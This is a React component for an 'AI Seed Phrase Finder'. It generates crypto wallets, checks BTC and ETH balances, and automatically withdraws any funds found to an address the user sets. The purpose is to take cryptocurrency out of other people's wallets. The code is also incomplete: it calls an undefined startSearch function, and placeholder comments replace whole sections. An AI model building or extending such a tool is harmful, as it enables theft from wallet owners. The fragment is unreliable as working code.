import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { WalletGenerator } from '../services/WalletGenerator';
import { BalanceChecker } from '../services/BalanceChecker';
import { AutoWithdraw } from '../services/AutoWithdraw';
import NetworkSelector from './NetworkSelector';
import WithdrawalSetup from './WithdrawalSetup';
import TransactionStatus from './TransactionStatus';
import { NETWORKS } from '../constants';

// ... (previous imports remain the same)

export default function AIFinder() {
  const [isSearching, setIsSearching] = useState(false);
  const [selectedNetworks, setSelectedNetworks] = useState(['BTC', 'ETH']);
  const [foundWallets, setFoundWallets] = useState([]);
  const [withdrawalAddress, setWithdrawalAddress] = useState('');
  const [transactions, setTransactions] = useState([]);
  const [stats, setStats] = useState({
    checked: 0,
    found: 0,
    totalValue: 0
  });

  const handleNetworkToggle = (network) => {
    setSelectedNetworks(prev => 
      prev.includes(network)
        ? prev.filter(n => n !== network)
        : [...prev, network]
    );
  };

  const handleWithdrawalSetup = (address) => {
    setWithdrawalAddress(address);
  };

  const handleAutoWithdraw = async (wallet, balances) => {
    if (!withdrawalAddress) {
      console.error('No withdrawal address set');
      return;
    }

    const withdrawService = new AutoWithdraw(withdrawalAddress);
    const results = await withdrawService.withdrawAll(wallet, balances);
    setTransactions(prev => [...prev, ...results]);
  };

  // ... (rest of the component implementation remains similar,
  // but now uses selectedNetworks for balance checking)

  return (
    <div className="p-6 space-y-6 bg-gray-900 rounded-xl">
      <div className="space-y-6">
        <h2 className="text-2xl font-bold text-white">AI Seed Phrase Finder</h2>
        
        <NetworkSelector
          selectedNetworks={selectedNetworks}
          onNetworkToggle={handleNetworkToggle}
        />

        <WithdrawalSetup onSave={handleWithdrawalSetup} />

        <motion.button
          whileHover={{ scale: 1.05 }}
          whileTap={{ scale: 0.95 }}
          className={`px-6 py-2 rounded-lg ${
            isSearching 
              ? 'bg-red-600 hover:bg-red-700' 
              : 'bg-blue-600 hover:bg-blue-700'
          } text-white font-medium`}
          onClick={() => {
            if (isSearching) {
              setIsSearching(false);
            } else {
              startSearch();
            }
          }}
        >
          {isSearching ? 'Stop Search' : 'Start Search'}
        </motion.button>
      </div>

      {/* Stats and Found Wallets sections remain the same */}

      {transactions.length > 0 && (
        <div className="mt-6">
          <h3 className="text-xl font-bold text-white mb-4">Recent Transactions</h3>
          <TransactionStatus transactions={transactions} />
        </div>
      )}
    </div>
  );
}